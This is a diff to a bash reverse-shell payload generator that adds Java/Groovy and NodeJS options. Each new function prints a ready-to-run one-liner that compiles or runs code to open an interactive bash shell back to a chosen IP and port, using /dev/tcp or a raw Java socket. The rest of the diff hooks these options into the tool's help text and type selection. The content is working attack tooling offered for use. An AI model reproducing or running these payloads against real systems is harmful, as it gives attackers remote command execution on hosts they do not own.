@@ -99,6 +99,20 @@ pshell() {
     echo "" 
     echo "" 
 }
+java_or_groovy() {
+    echo "[ + ] Java/Groovy"
+    echo ""
+    echo "echo 'public class Shell {public static void main(String[] args) {try {Runtime r = Runtime.getRuntime();Process p = r.exec(new String[] {\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"});p.waitFor();} catch (Exception ex) {System.out.println(ex);}}}' > Shell.java && javac Shell.java && java Shell"
+    echo ""
+    echo "echo 'import java.net.Socket;import java.io.InputStream;import java.io.OutputStream;public class Shell {public static void main(String[] args) {try {String host=\"$ip\";int port=$port;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();} catch (Exception ex) {System.out.println(ex);}}}' > Shell.java && javac Shell.java && java Shell"
+    echo ""
+}
+nodejs() {
+    echo "[ + ] NodeJS"
+    echo ""
+    echo "echo 'global.process.mainModule.require(\"child_process\").spawn(\"/bin/bash\", [\"-c\", \"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"]);' > shell.js && node shell.js"
+    echo ""
+}
 shells() {
     netcat
     basher
@@ -108,6 +122,8 @@ shells() {
     rubi
     golang
     pshell
+    java_or_groovy
+    nodejs
 }
 
 helper () {
@@ -129,6 +145,9 @@ helper () {
     echo "-t ruby"
     echo "-t golang"
     echo "-t powershell"
+    echo "-t java"
+    echo "-t groovy"
+    echo "-t nodejs"
     echo ""
     echo " Example Usage:"
     echo ""
@@ -168,6 +187,14 @@ typer() {
     if [ "$type" == "powershell" ]
     then
         pshell
+    fi
+    if [ "$type" == "java" ] || [ "$type" == "groovy" ]
+    then
+        java_or_groovy
+    fi
+    if [ "$type" == "nodejs" ]
+    then
+        nodejs
     fi
 
 }
